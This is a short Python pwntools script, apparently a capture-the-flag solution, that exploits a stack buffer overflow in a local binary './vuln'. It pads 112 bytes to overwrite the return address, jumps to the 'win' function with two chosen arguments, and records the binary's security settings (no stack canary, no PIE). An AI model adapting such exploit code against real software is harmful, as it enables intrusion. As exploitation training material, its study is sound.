#!/usr/bin/env python3

from pwn import *

exe = './vuln'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#host,port = '',

p = process(exe)
#p = remote(host,port)

padding = 112
param1 = 0xdeadbeef
param2 = 0xdeadc0de

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    elf.symbols['win'],
    0x0,
    param1,
    param2
)

p.sendlineafter(b':',payload)
p.interactive()

'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

'''
